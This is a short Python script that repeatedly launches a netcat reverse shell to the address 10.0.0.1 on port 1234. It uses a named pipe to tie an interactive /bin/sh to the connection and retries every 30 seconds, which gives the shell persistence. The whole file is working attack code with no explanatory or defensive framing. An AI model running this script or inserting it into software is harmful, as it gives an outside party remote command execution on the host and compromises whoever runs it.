#!/bin/python3.9
import os
import time
cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f"
while True:
    os.system(cmd)
    time.sleep(30)
